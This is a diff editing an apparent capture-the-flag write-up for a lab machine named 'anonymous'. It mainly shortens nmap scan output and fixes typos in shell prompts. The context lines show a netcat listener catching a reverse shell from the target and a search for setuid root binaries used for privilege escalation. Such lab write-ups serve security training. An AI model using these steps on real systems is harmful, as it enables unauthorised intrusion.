@@ -100,21 +100,13 @@ PORT    STATE SERVICE     REASON         VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:[Attack_Box]5
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 5
-|      vsFTPd 3.0.3 - secure, fast, stable
+...
 |_End of status
 22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 ... 
 |   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (EdDSA)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
+...
 139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 MAC Address: 02:3E:C2:17:0E:5B (Unknown)
@@ -138,17 +130,7 @@ Host script results:
 |   WORKGROUP<00>        Flags: <group><active>
 |   WORKGROUP<1d>        Flags: <unique><active>
 |   WORKGROUP<1e>        Flags: <group><active>
-| Statistics:
-|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
-| p2p-conficker: 
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 50957/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 36357/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 44313/udp): CLEAN (Failed to receive data)
-|   Check 4 (port 10889/udp): CLEAN (Failed to receive data)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+...
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
 |   Computer name: anonymous
@@ -168,21 +150,7 @@ Host script results:
 |   date: 2024-11-11 03:24:11
 |_  start_date: 1600-12-31 23:58:45
 
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.54 ms ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106)
-
-NSE: Script Post-scanning.
-NSE: Starting runlevel 1 (of 2) scan.
-Initiating NSE at 03:24
-Completed NSE at 03:24, 0.00s elapsed
-NSE: Starting runlevel 2 (of 2) scan.
-Initiating NSE at 03:24
-Completed NSE at 03:24, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds
-           Raw packets sent: 1180 (61.662KB) | Rcvd: 1138 (54.786KB)
+...
 </code></pre>
 
 <br>
@@ -292,7 +260,7 @@ Running cleanup script:  nothing to delete
 
 <br>
 
-<pre><code>root@ip-[Attack_Box]:~/anonymous# at clean.sh
+<pre><code>root@ip-[Attack_Box]:~/anonymous# cat clean.sh
 #!/bin/bash
 
 tmp_files=0
@@ -352,7 +320,7 @@ ftp>
 
 <br>
 
-<pre><code>oot@ip-[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
+<pre><code>root@ip-[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from [Target] 34812 received!
 bash: cannot set terminal process group (1522): Inappropriate ioctl for device
@@ -375,7 +343,6 @@ namelessone@anonymous:~$
 <br>
 
 <pre><code>namelessone@anonymous:~$ sudo -l
-udo -l
 sudo: no tty present and no askpass program specified
 namelessone@anonymous:~$ find / -user root -perm -u=s 2>/dev/null
 find / -user root -perm -u=s 2>/dev/null
